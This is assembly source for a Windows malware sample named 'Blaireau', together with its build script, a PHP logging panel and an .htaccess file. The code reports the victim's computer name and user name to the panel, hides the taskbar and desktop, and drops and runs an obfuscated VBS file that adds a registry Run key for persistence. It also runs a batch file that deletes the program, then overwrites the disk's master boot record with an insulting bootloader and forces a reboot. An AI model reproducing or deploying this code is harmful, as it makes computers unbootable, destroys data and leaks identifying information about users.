; =========================================================================
; -------------------------------------------------------------------------
;     FILENAME : Blaireau.asm
; -------------------------------------------------------------------------
;       AUTHOR : Xylitol
;        EMAIL : xylitol☆temari.fr
;         TEST : Windows XP SP3
;         SIZE : 6.50Kb
;  DESCRIPTION : 1) Report to panel the infection
;				 2) Hide the taskbar Drop a .VBS and a .BAT
;				 3) Execute them
;				 4) Annihilate the MBR and reboot
; -------------------------------------------------------------------------
;                 This source is considered dangerous
; -------------------------------------------------------------------------
; =========================================================================
 
; ---- make.bat -----------------------------------------------------------
;@echo off
;set path=\masm32\bin
;set lib=\masm32\lib
;set name=Blaireau
;ml.exe /c /coff "%name%".asm
;link.exe /SUBSYSTEM:WINDOWS /opt:nowin98 /LIBPATH:"%lib%" "%name%".obj
;del *.OBJ
;pause
;@echo on
;cls

; ---- post.php -----------------------------------------------------------
;<?php
;$ip = $_SERVER['REMOTE_ADDR'];
;$computername = $_POST['computername'];
;$username = $_POST['username'];
;$content=file_get_contents('log.txt');
;if(strpos($content,$ip) !== false) {Header("Location:http://yandex.ru/yandsearch?text=some+men+just+want+to+watch+the+world+burn");}
;$fh = fopen('log.txt', 'a'); 
;fwrite($fh, '[IP Address: '. $ip ."] [Computer: ". $computername ."] [Username: ". $username ."]\n");
;fclose($fh);
;?>

; ---- .htaccess ----------------------------------------------------------
;<Files log.txt>
;	Order Allow,Deny
;	Deny from all
;</Files>

; ---- skeleton -----------------------------------------------------------
.386
.model flat, stdcall
option casemap :none   ; case sensitive

; ---- Include ------------------------------------------------------------
include \masm32\include\windows.inc
include \masm32\include\user32.inc
include \masm32\include\kernel32.inc
include \masm32\include\shell32.inc
include \masm32\include\ntdll.inc
include \masm32\include\wininet.inc
include \masm32\include\advapi32.inc
include \masm32\macros\macros.asm
	  
includelib \masm32\lib\shell32.lib
includelib \masm32\lib\user32.lib
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\ntdll.lib
includelib \masm32\lib\wininet.lib
includelib \masm32\lib\advapi32.lib

bufSize=MAX_COMPUTERNAME_LENGTH + 1

; ---- Uninitialized data -------------------------------------------------
.data?
szReversed		db 		512 dup (?)
tmpFilePath		db 		512 dup (?)
payload			db 		512 dup (?)
buffer			dd		512 dup (?)
bytesWritten	dd		512 dup (?)
szlen			dd		?
hInternet		dd		?
hConnect		dd		?
hRequest		dd		?
dwBytesRead		dd		?
postdatalen		dd		?

; ---- Initialized data ---------------------------------------------------
.data
shell			db	"Shell_TrayWnd",0
explorer		db	"Progman",0
Filename 		db	"Blaireau.vbs",0
Filename2 		db	"Blaireau.bat",0
volume			db	'\\.\PhysicalDrive0',0

format1			db	'computername=%s&username=%s',0
postdata		db	100 dup(0)
bSize			dd	bufSize
computer_name	db	bufSize dup(?)
user_name		db	bufSize dup(?)
szData			db	1024 dup(0)
host			db	"localhost",0
headers			db	13,10,"Keep-Alive: 115",
					13,10,"Connection: keep-alive",
					13,10,"Content-Type: application/x-www-form-urlencoded",0

; VBS Payload, basically it just add a registry persistance and display a messagebox.
; If you ask me why i haven't used RegCreateKey/RegSetValueEx instead... well, generating a VBS from ASM was more fun ;)
payload1		db " tpircsw",022h,",",022h,"kcirreD\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\ENIHCAM_LACOL_YEKH",022h," etirWgeR.tideger",13,10
				db ")",022h,"llehS.tpircSW",022h,"(tcejbOetaerC = tideger teS",13,10
				db ")1(redloFlaicepSteG.osf = metsysrid teS",13,10
				db "txeN emuseR rorrE nO",13,10
				db ")",022h,"tcejbOmetsySeliF.gnitpircS",022h,"(tcejbOetaerC = osf teS",13,10
				db "metsysrid ,osf miD",0

payload2		db 022h,"ékiN T",022h," xobgsM",13,10
				db 022h,0

; Auto-remove via .bat file, this one isn't 'reversed'
melt			db ":repeat",13,10
				db "if not exist ",022h,"blaireau.exe",022h," goto exit",13,10
				db "attrib -R -S -H ",022h,"blaireau.exe",022h,13,10
				db "erase ",022h,"blaireau.exe",13,10
				db "goto repeat",13,10
				db ":exit",13,10
				db "attrib -R -S -H ",022h,"Blaireau.bat",022h,13,10
				db "erase ",022h,"Blaireau.bat",022h,0

; New bootloader, it will print "I am virus! Fuck you :-)"
KillMBR			db	0B8h,12h,00h,0CDh,10h,0BDh,18h,7Ch,0B9h,18h,00h,0B8h,01h,13h,0BBh,0Ch
				db	00h,0BAh,1Dh,0Eh,0CDh,10h,0E2h,0FEh,49h,20h,61h,6Dh,20h,76h,69h,72h
				db	75h,73h,21h,20h,46h,75h,63h,6Bh,20h,79h,6Fh,75h,20h,3Ah,2Dh,29h
				db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
				db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
				db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
				db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
				db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
				db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
				db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
				db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
				db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
				db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
				db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
				db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
				db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
				db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
				db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
				db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
				db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
				db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
				db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
				db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
				db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
				db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
				db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
				db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
				db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
				db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
				db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
				db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
				db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,55h,0AAh

; ---- Code ---------------------------------------------------------------
.code
start:
		invoke GetComputerName,addr computer_name,addr bSize
		invoke GetUserName,addr user_name,addr bSize
		invoke wsprintf,ADDR postdata,ADDR format1,ADDR computer_name,addr user_name
		invoke lstrlen,addr postdata
		mov postdatalen,eax
		call SendReq ;will report logs to panel
		invoke GetTempPath, 255,addr tmpFilePath
		invoke lstrcat,addr tmpFilePath,addr Filename
		
		invoke lstrlen, addr tmpFilePath
		mov ecx,eax
		mov esi, offset tmpFilePath
		call lstrrev
		
		invoke lstrcpy,addr payload,addr payload2
		invoke lstrcat,addr payload,addr szReversed
		invoke lstrcat,addr payload,addr payload1
		
DlgProc	proc hWin:DWORD,uMsg:DWORD,wParam:DWORD,lParam:DWORD
LOCAL	hFile:DWORD,NumBytes:DWORD

		invoke FindWindow,addr shell,NULL ;  Get handle first then hide it. 
		.if eax != 0
			invoke ShowWindow,eax,SW_HIDE ; use SW_SHOW to show it again
			invoke OutputDebugString,chr$("[Blaireau] --> Taskbar hidden")
		.endif
		invoke FindWindow,addr explorer,NULL
		.if eax != 0
			invoke ShowWindow,eax,SW_HIDE
			invoke OutputDebugString,chr$("[Blaireau] --> explorer hidden")
		.endif
		
		invoke lstrlen, addr payload
		mov ecx,eax
		mov esi, offset payload
		call lstrrev
		invoke OutputDebugString,chr$("[Blaireau] --> Payload reversed")

		invoke lstrlen,addr szReversed
		mov szlen,eax

		invoke CreateFile,addr tmpFilePath,GENERIC_WRITE,FILE_SHARE_WRITE,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL
		mov hFile,eax
		invoke WriteFile, hFile,addr szReversed, szlen, addr NumBytes, NULL
		invoke CloseHandle,hFile 
		invoke OutputDebugString,chr$("[Blaireau] --> Blaireau.vbs wrote")
		mov szlen,0

		invoke lstrlen,addr melt
		mov szlen,eax

		invoke CreateFile,addr Filename2,GENERIC_WRITE,FILE_SHARE_WRITE,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL
		mov hFile,eax
		invoke WriteFile, hFile,addr melt, szlen, addr NumBytes, NULL
		invoke CloseHandle,hFile 
		mov szlen,0
		invoke OutputDebugString,chr$("[Blaireau] --> Blaireau.bat wrote")
		
		invoke ShellExecute,hWin,chr$("open"),addr tmpFilePath,NULL,NULL,SW_SHOWNORMAL
		invoke OutputDebugString,chr$("[Blaireau] --> Blaireau.vbs executed")
		invoke ShellExecute,hWin,chr$("open"),addr Filename2,NULL,NULL,SW_HIDE
		invoke OutputDebugString,chr$("[Blaireau] --> Blaireau.bat executed")
		
		invoke CreateFile,offset volume,GENERIC_READ+GENERIC_WRITE,FILE_SHARE_READ+FILE_SHARE_WRITE,0,OPEN_EXISTING,0,0
			.if eax==0 ;If fail jump on ExitProcess
			.else
				mov hFile,eax
					cld ;Trick to move the bootloader into the buffer with rep movsb
					lea esi, KillMBR
					lea edi, buffer
					mov ecx, 512
					rep movsb
				push eax
				mov eax,esp
		invoke WriteFile,hFile,addr buffer,512,addr bytesWritten,NULL ;write the new bootloader
			.if eax==0 ;If fail jump on ExitProcess
			.else
				invoke OutputDebugString,chr$("[Blaireau] --> Bootloader wrote")
				invoke CloseHandle,hFile
				invoke RtlAdjustPrivilege,13h,1h,0h,esp ;Needed for reboot
				invoke ExitWindowsEx,2,10 ;Reboot the computer
				invoke OutputDebugString,chr$("[Blaireau] --> Reboot requested")
		.endif
		.endif
finish:
		invoke OutputDebugString,chr$("[Blaireau] --> Bye !")
		push 0
		call ExitProcess
DlgProc	endp

SendReq PROC
		mov hInternet,FUNC(InternetOpen,chr$("WinInet Test"),INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0)
		.if hInternet==NULL
			invoke OutputDebugString,chr$("[Blaireau] -> InternetOpen error")
			exit
		.endif
		invoke InternetConnect,hInternet,offset host,INTERNET_DEFAULT_HTTP_PORT,NULL,NULL,INTERNET_SERVICE_HTTP,0,0
		mov hConnect,eax
		.if hConnect == NULL
			invoke OutputDebugString,chr$("[Blaireau] -> InternetConnect error")
			exit
		.endif
		mov hRequest,FUNC(HttpOpenRequest,hConnect,chr$("POST"),chr$("/post.php"),NULL,chr$("localhost/post.php"),0,INTERNET_FLAG_KEEP_CONNECTION,1)
		.if hRequest == NULL
			invoke OutputDebugString,chr$("[Blaireau] -> HttpOpenRequest error")
			exit
		.endif
		invoke HttpSendRequest,hRequest,offset headers,sizeof headers-1,offset postdata,postdatalen
		.if eax == 0
			invoke OutputDebugString,chr$("[Blaireau] -> HttpSendRequest error")
			exit
		.endif
		invoke InternetReadFile,hRequest,offset szData,sizeof szData-1,offset dwBytesRead
		test eax,eax ;if (bRead == FALSE)
		jz @exit
		.if dwBytesRead==0
			jmp @exit
		.endif
		invoke OutputDebugString,chr$("[Blaireau] --> Reported to panel")
		@exit:
			invoke InternetCloseHandle,hRequest
			invoke InternetCloseHandle,hConnect
			invoke InternetCloseHandle,hInternet
			ret
SendReq ENDP

lstrrev proc
	lea edi, offset szReversed
	xor ebx, ebx
		Reversor:
			mov al, byte ptr[esi+ecx-1]
			mov byte ptr[edi+ebx], al
			inc ebx
			dec ecx
		jnz Reversor
			mov byte ptr[edi+ebx], 0
	Ret
lstrrev endp

end start